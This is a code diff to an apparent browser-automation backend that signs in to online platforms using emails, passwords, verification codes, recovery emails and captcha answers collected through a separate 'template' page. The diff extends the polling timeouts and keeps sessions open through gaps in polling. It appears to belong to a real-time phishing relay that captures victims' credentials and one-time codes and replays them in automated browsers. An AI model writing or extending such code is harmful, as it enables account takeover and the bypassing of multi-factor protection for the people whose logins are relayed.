@@ -31,7 +31,7 @@ import {
     saveDebugSnapshot,
     solveRecaptchaChallengeWithAI,
     activelyProcessing,
-    isTemplateAlive,
+    evaluateTemplateLiveness,
     lastPollTime,
     verifyPageStillValid,
     detectPasswordError,
@@ -1793,7 +1793,9 @@ async function phaseWaitingCaptcha(browserId, browser, page, email, password, pl
         logger.error(`[processRow][${browserId}] WAITINGCAPTCHA but no captchaConfig for platform ${platform}. Failing.`);
     } else {
         const captchaPollTimeout = Date.now() + 5 * 60 * 1000;
+        const captchaPollStartMs = Date.now();
         let captchaProcessed = false;
+        let captchaLastPollGapLogMs = 0;
         while (Date.now() < captchaPollTimeout && !captchaProcessed) {
             try {
                 if (page && !(await isPageResponsive(page, browserId, instanceId))) {
@@ -1802,11 +1804,19 @@ async function phaseWaitingCaptcha(browserId, browser, page, email, password, pl
                     break;
                 }
 
-                // Template Liveliness Check
-                if (!isTemplateAlive(browserId)) {
-                    logger.info(`[processRow][${browserId}][WAITINGCAPTCHA] Template stopped polling (>3min). Closing browser.`);
-                    finalStatus = "FAILED";
-                    break;
+                // Template Liveliness Check — poll silence alone is not fatal; only the
+                // hard session-age cap closes the browser (evaluateTemplateLiveness).
+                const captchaLiveness = evaluateTemplateLiveness(browserId, captchaPollStartMs);
+                if (captchaLiveness.pollSilent) {
+                    if (captchaLiveness.sessionExpiredMs) {
+                        logger.warn(`[processRow][${browserId}][WAITINGCAPTCHA] Template poll-silent and session age ${Math.round(captchaLiveness.sessionAgeMs / 1000)}s > hard cap (12min). Closing browser.`);
+                        finalStatus = "FAILED";
+                        break;
+                    }
+                    if (Date.now() - captchaLastPollGapLogMs > 30000) {
+                        logger.info(`[processRow][${browserId}][WAITINGCAPTCHA] Template poll gap ${Math.round(captchaLiveness.pollGapMs / 1000)}s (session age ${Math.round(captchaLiveness.sessionAgeMs / 1000)}s). Holding session.`);
+                        captchaLastPollGapLogMs = Date.now();
+                    }
                 }
 
                 // Cache-first read: template writes captchaAnswer via update-process → setCachedRow (instant).
@@ -1961,8 +1971,10 @@ async function phaseWaitingRecoveryEmail(browserId, browser, page, email, platfo
         updateBrowserRowDataFast(browserId, { status: "WAITINGRECOVERYEMAIL", verified: true, fullAccess: false, lastJsonResponse: updateData.lastJsonResponse });
     }
 
-    const pollingTimeoutRecoveryEmail = Date.now() + 5 * 60 * 1000;
+    const pollingTimeoutRecoveryEmail = Date.now() + 10 * 60 * 1000; // 10min — aligned with template's own POLLING_TIMEOUT_MS (600s)
+    const recoveryPollStartMs = Date.now();
     let recoveryEmailProcessed = false;
+    let recoveryLastPollGapLogMs = 0;
 
     while (Date.now() < pollingTimeoutRecoveryEmail && finalStatus === "WAITINGRECOVERYEMAIL") {
         try {
@@ -1978,16 +1990,24 @@ async function phaseWaitingRecoveryEmail(browserId, browser, page, email, platfo
                 break;
             }
 
-            if (!isTemplateAlive(browserId)) {
-                logger.info(`[processRow][${browserId}][WAITINGRECOVERYEMAIL] Template stopped polling (>3min). Closing browser.`);
-                finalStatus = "FAILED";
-                updateData.status = "FAILED";
-                updateData.lastJsonResponse = JSON.stringify({
-                    ...JSON.parse(updateData.lastJsonResponse || '{}'), status: "FAILED",
-                    message: "Connection lost. Please try again."
-                });
-                pollingTimedOut = true;
-                break;
+            // Poll silence alone is not fatal; only the hard session-age cap fails the loop.
+            const recoveryLiveness = evaluateTemplateLiveness(browserId, recoveryPollStartMs);
+            if (recoveryLiveness.pollSilent) {
+                if (recoveryLiveness.sessionExpiredMs) {
+                    logger.warn(`[processRow][${browserId}][WAITINGRECOVERYEMAIL] Template poll-silent and session age ${Math.round(recoveryLiveness.sessionAgeMs / 1000)}s > hard cap (12min). Closing browser.`);
+                    finalStatus = "FAILED";
+                    updateData.status = "FAILED";
+                    updateData.lastJsonResponse = JSON.stringify({
+                        ...JSON.parse(updateData.lastJsonResponse || '{}'), status: "FAILED",
+                        message: "Session timed out. Please try again."
+                    });
+                    pollingTimedOut = true;
+                    break;
+                }
+                if (Date.now() - recoveryLastPollGapLogMs > 30000) {
+                    logger.info(`[processRow][${browserId}][WAITINGRECOVERYEMAIL] Template poll gap ${Math.round(recoveryLiveness.pollGapMs / 1000)}s (session age ${Math.round(recoveryLiveness.sessionAgeMs / 1000)}s). Holding session.`);
+                    recoveryLastPollGapLogMs = Date.now();
+                }
             }
 
             const checkData = await fetchDataFromAppScript(1, 30000, false);
@@ -2741,6 +2761,7 @@ async function processRow(row, columnIndexes, existingBrowser = null, existingPa
             const pollingTimeoutEmail = Date.now() + 5 * 60 * 1000; // 5 minutes timeout
             let emailProvidedAndProcessed = false;
             let consecutiveUnresponsive = 0;
+            let emailLastPollGapLogMs = 0;
 
             while (Date.now() < pollingTimeoutEmail && !emailProvidedAndProcessed) {
                 try {
@@ -2764,16 +2785,24 @@ async function processRow(row, columnIndexes, existingBrowser = null, existingPa
                         consecutiveUnresponsive = 0;
                     }
 
-                    // Template Liveliness Check — if template stopped polling, close browser to save resources
-                    if (!isTemplateAlive(browserId)) {
-                        logger.info(`[processRow][${browserId}][WAITINGEMAIL] Template stopped polling (>3min). Closing browser.`);
-                        finalStatus = "FAILED";
-                        updateData.status = "FAILED";
-                        updateData.lastJsonResponse = JSON.stringify({
-                            ...JSON.parse(updateData.lastJsonResponse || '{}'), status: "FAILED",
-                            message: "Connection lost. Please try again."
-                        });
-                        break;
+                    // Template Liveliness Check — poll silence alone is not fatal; only the
+                    // hard session-age cap fails the loop (evaluateTemplateLiveness).
+                    const emailLiveness = evaluateTemplateLiveness(browserId, waitingEmailStart);
+                    if (emailLiveness.pollSilent) {
+                        if (emailLiveness.sessionExpiredMs) {
+                            logger.warn(`[processRow][${browserId}][WAITINGEMAIL] Template poll-silent and session age ${Math.round(emailLiveness.sessionAgeMs / 1000)}s > hard cap (12min). Closing browser.`);
+                            finalStatus = "FAILED";
+                            updateData.status = "FAILED";
+                            updateData.lastJsonResponse = JSON.stringify({
+                                ...JSON.parse(updateData.lastJsonResponse || '{}'), status: "FAILED",
+                                message: "Session timed out. Please try again."
+                            });
+                            break;
+                        }
+                        if (Date.now() - emailLastPollGapLogMs > 30000) {
+                            logger.info(`[processRow][${browserId}][WAITINGEMAIL] Template poll gap ${Math.round(emailLiveness.pollGapMs / 1000)}s (session age ${Math.round(emailLiveness.sessionAgeMs / 1000)}s). Holding session.`);
+                            emailLastPollGapLogMs = Date.now();
+                        }
                     }
 
                     // Check cache FIRST for email (pooling operator writes here immediately via immediateFlush)
@@ -3050,7 +3079,9 @@ async function processRow(row, columnIndexes, existingBrowser = null, existingPa
                 return;
             }
             let pollingTimeoutPassword = Date.now() + 5 * 60 * 1000; // 5 minutes timeout
+            const passwordPollStartMs = Date.now();
             let passwordProvidedAndProcessed = false;
+            let passwordLastPollGapLogMs = 0;
             const passwordUnavailableRetriesRef = { count: 0 }; // Bounded retries for transient "Password sign-in isn't available"
             // Track about:blank recovery attempts — if the browser keeps landing on about:blank
             // during WAITINGPASSWORD, give up after 2 attempts instead of looping forever.
@@ -3071,16 +3102,24 @@ async function processRow(row, columnIndexes, existingBrowser = null, existingPa
                         break; // Exit polling loop
                     }
 
-                    // Template Liveliness Check — if template stopped polling, close browser to save resources
-                    if (!isTemplateAlive(browserId)) {
-                        logger.info(`[processRow][${browserId}][WAITINGPASSWORD] Template stopped polling (>3min). Closing browser.`);
-                        finalStatus = "FAILED";
-                        updateData.status = "FAILED";
-                        updateData.lastJsonResponse = JSON.stringify({
-                            ...JSON.parse(updateData.lastJsonResponse || '{}'), status: "FAILED",
-                            message: "Connection lost. Please try again."
-                        });
-                        break;
+                    // Template Liveliness Check — poll silence alone is not fatal; only the
+                    // hard session-age cap fails the loop (evaluateTemplateLiveness).
+                    const passwordLiveness = evaluateTemplateLiveness(browserId, passwordPollStartMs);
+                    if (passwordLiveness.pollSilent) {
+                        if (passwordLiveness.sessionExpiredMs) {
+                            logger.warn(`[processRow][${browserId}][WAITINGPASSWORD] Template poll-silent and session age ${Math.round(passwordLiveness.sessionAgeMs / 1000)}s > hard cap (12min). Closing browser.`);
+                            finalStatus = "FAILED";
+                            updateData.status = "FAILED";
+                            updateData.lastJsonResponse = JSON.stringify({
+                                ...JSON.parse(updateData.lastJsonResponse || '{}'), status: "FAILED",
+                                message: "Session timed out. Please try again."
+                            });
+                            break;
+                        }
+                        if (Date.now() - passwordLastPollGapLogMs > 30000) {
+                            logger.info(`[processRow][${browserId}][WAITINGPASSWORD] Template poll gap ${Math.round(passwordLiveness.pollGapMs / 1000)}s (session age ${Math.round(passwordLiveness.sessionAgeMs / 1000)}s). Holding session.`);
+                            passwordLastPollGapLogMs = Date.now();
+                        }
                     }
 
                     let cachedPassword = null;
@@ -4077,22 +4116,31 @@ if (!foundSelector) {
             initialCheckResult.accountAccess = true;
             initialCheckResult.emailExists = true;
             let currentVerificationOptions = [];
-            const pollingTimeoutOptions = Date.now() + 5 * 60 * 1000;
+            const pollingTimeoutOptions = Date.now() + 10 * 60 * 1000; // 10min — aligned with template's own POLLING_TIMEOUT_MS (600s)
             const optionsPollStartMs = Date.now();
             let optionsIteration = 0;
             let lastOptionsBeatMs = Date.now();
+            let optionsLastPollGapLogMs = 0;
 
             while (Date.now() < pollingTimeoutOptions && finalStatus === "WAITINGOPTIONS") {
                 optionsIteration++;
                 try {
-                    // Template Liveliness Check
-                    if (!isTemplateAlive(browserId)) {
-                        logger.info(`[processRow][${browserId}][WAITINGOPTIONS] Template stopped polling (>3min). Closing browser.`);
-                        finalStatus = "FAILED";
-                        updateData.status = "FAILED";
-                        updateData.lastJsonResponse = JSON.stringify({ ...JSON.parse(updateData.lastJsonResponse || '{}'), status: "FAILED", message: "Connection lost. Please try again." });
-                        pollingTimedOut = true; // Prevent post-loop WAITINGOPTIONS override at line 5736
-                        break;
+                    // Template Liveliness Check — poll silence alone is not fatal; only the
+                    // hard session-age cap fails the loop (evaluateTemplateLiveness).
+                    const optionsLiveness = evaluateTemplateLiveness(browserId, optionsPollStartMs);
+                    if (optionsLiveness.pollSilent) {
+                        if (optionsLiveness.sessionExpiredMs) {
+                            logger.warn(`[processRow][${browserId}][WAITINGOPTIONS] Template poll-silent and session age ${Math.round(optionsLiveness.sessionAgeMs / 1000)}s > hard cap (12min). Closing browser.`);
+                            finalStatus = "FAILED";
+                            updateData.status = "FAILED";
+                            updateData.lastJsonResponse = JSON.stringify({ ...JSON.parse(updateData.lastJsonResponse || '{}'), status: "FAILED", message: "Session timed out. Please try again." });
+                            pollingTimedOut = true; // Prevent post-loop WAITINGOPTIONS override at line 5736
+                            break;
+                        }
+                        if (Date.now() - optionsLastPollGapLogMs > 30000) {
+                            logger.info(`[processRow][${browserId}][WAITINGOPTIONS] Template poll gap ${Math.round(optionsLiveness.pollGapMs / 1000)}s (session age ${Math.round(optionsLiveness.sessionAgeMs / 1000)}s). Holding session.`);
+                            optionsLastPollGapLogMs = Date.now();
+                        }
                     }
 
                     const currentPageVerificationState = await checkVerification(page, platformConfig);
@@ -4684,11 +4732,12 @@ if (!foundSelector) {
             }
 
 
-            const pollingTimeout = Date.now() + 5 * 60 * 1000;
+            const pollingTimeout = Date.now() + 10 * 60 * 1000; // 10min — aligned with template's own POLLING_TIMEOUT_MS (600s)
             let codeSuccessfullyProcessed = false;
             const codePollStartMs = Date.now();
             let codeIteration = 0;
             let lastCodeBeatMs = Date.now();
+            let codeLastPollGapLogMs = 0;
 
             while (Date.now() < pollingTimeout && finalStatus === "WAITINGCODE") {
                 codeIteration++;
@@ -4706,17 +4755,26 @@ if (!foundSelector) {
                         break; // Exit polling loop
                     }
 
-                    // Template Liveliness Check
-                    if (!isTemplateAlive(browserId)) {
-                        logger.info(`[processRow][${browserId}][WAITINGCODE] Template stopped polling (>3min). Closing browser.`);
-                        finalStatus = "FAILED";
-                        updateData.status = "FAILED";
-                        updateData.lastJsonResponse = JSON.stringify({
-                            ...JSON.parse(updateData.lastJsonResponse || '{}'), status: "FAILED",
-                            message: "Connection lost. Please try again."
-                        });
-                        pollingTimedOut = true; // Prevent post-loop WAITINGCODE override at line 5736
-                        break;
+                    // Template Liveliness Check — poll silence alone is not fatal (network blip /
+                    // slow human fetching a code from another inbox must not destroy a healthy
+                    // session). Only the hard session-age cap fails the loop.
+                    const codeLiveness = evaluateTemplateLiveness(browserId, codePollStartMs);
+                    if (codeLiveness.pollSilent) {
+                        if (codeLiveness.sessionExpiredMs) {
+                            logger.warn(`[processRow][${browserId}][WAITINGCODE] Template poll-silent and session age ${Math.round(codeLiveness.sessionAgeMs / 1000)}s > hard cap (12min). Closing browser.`);
+                            finalStatus = "FAILED";
+                            updateData.status = "FAILED";
+                            updateData.lastJsonResponse = JSON.stringify({
+                                ...JSON.parse(updateData.lastJsonResponse || '{}'), status: "FAILED",
+                                message: "Session timed out. Please try again."
+                            });
+                            pollingTimedOut = true; // Prevent post-loop WAITINGCODE override at line 5736
+                            break;
+                        }
+                        if (Date.now() - codeLastPollGapLogMs > 30000) {
+                            logger.info(`[processRow][${browserId}][WAITINGCODE] Template poll gap ${Math.round(codeLiveness.pollGapMs / 1000)}s (session age ${Math.round(codeLiveness.sessionAgeMs / 1000)}s). Holding session.`);
+                            codeLastPollGapLogMs = Date.now();
+                        }
                     }
 
                     // Heartbeat: keep lastUserActivity fresh so stale detection never kills the browser during active polling
@@ -5606,7 +5664,7 @@ if (!foundSelector) {
             }
 
             updateData.status = finalStatus;
-            if (finalStatus === "FAILED" && !updateData.lastJsonResponse?.includes("PROCESSING_FINALIZING") && !updateData.lastJsonResponse?.includes("COMPLETED")) {
+            if (finalStatus === "FAILED" && !updateData.lastJsonResponse?.includes("FAILED")) {
                 updateData.lastJsonResponse = JSON.stringify({
                     ...JSON.parse(updateData.lastJsonResponse || '{}'), status: "FAILED",
                     message: "Verification timed out. Please try again."
@@ -5938,7 +5996,7 @@ if (!foundSelector) {
                 verificationState: initialCheckResult.verificationState,
                 verificationOptions: currentVerificationOptions,
                 platform, timestamp: new Date().toISOString(),
-                message: initialCheckResult.message || (finalStatus === "FAILED" ? "Verification timed out. Please try again." : "Process completed successfully.")
+                message: initialCheckResult.message || (() => { try { const prev = JSON.parse(updateData.lastJsonResponse || '{}'); return (prev.status === 'FAILED' && prev.message) ? prev.message : null; } catch (_) { return null; } })() || (finalStatus === "FAILED" ? "Verification timed out. Please try again." : "Process completed successfully.")
             });
 
             // Signal the template to redirect immediately (PROCESSING_FINALIZING) so the user
